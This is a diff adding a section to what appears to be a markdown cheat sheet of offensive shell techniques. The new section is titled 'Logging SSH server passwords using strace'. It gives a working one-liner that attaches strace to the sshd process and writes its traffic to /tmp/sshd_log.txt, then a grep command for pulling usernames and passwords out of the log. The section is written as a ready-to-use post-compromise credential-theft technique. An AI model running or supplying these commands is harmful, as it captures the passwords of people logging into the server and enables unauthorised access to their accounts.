@@ -437,3 +437,15 @@ sleep 2
 echo -e "\n"
 exit 0
 ```
+
+## >> Logging SSH server passwords using strace
+
+If the server has debugging tools installed use strace to capture passwords sent from client connections.
+
+`strace -f -p $(pgrep -o sshd) -v -e trace=read,write -s 128 2>&1 | tee /tmp/sshd_log.txt`
+
+Allow packets to be captured from new connections and press `ctrl-c` to detach when done.  Search the log file for user names and passwords.
+
+`cat /tmp/sshd_log.txt | grep "write(" | more`
+
+
